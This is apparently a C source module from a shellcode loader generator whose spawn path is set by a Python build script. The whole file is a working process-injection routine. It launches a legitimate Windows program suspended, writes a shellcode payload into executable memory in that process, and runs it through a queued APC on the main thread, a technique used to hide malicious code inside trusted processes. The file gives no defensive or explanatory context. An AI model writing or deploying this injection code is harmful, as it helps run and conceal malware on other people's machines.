#ifdef USE_SPAWN

#include <windows.h>
#include <stdio.h>

// Placeholder that will be replaced by Python with the actual path
#ifndef SPAWN_PATH
#define SPAWN_PATH "C:\\Windows\\System32\\notepad.exe"
#endif

BOOL SpawnAndInject(PVOID pPayload, SIZE_T sPayload) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    LPVOID pRemote = NULL;
    HANDLE hThread = NULL;
    BOOL success = FALSE;

    // Create suspended process
    if (!CreateProcessA(SPAWN_PATH, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    // Allocate memory in the target process
    pRemote = VirtualAllocEx(pi.hProcess, NULL, sPayload,
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        goto cleanup;
    }

    // Write shellcode
    if (!WriteProcessMemory(pi.hProcess, pRemote, pPayload, sPayload, NULL)) {
        goto cleanup;
    }

    // Queue APC to the main thread
    if (!QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, (ULONG_PTR)NULL)) {
        goto cleanup;
    }

    // Resume thread to execute the APC
    ResumeThread(pi.hThread);
    success = TRUE;

cleanup:
    if (!success) {
        TerminateProcess(pi.hProcess, 0);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return success;
}

#endif
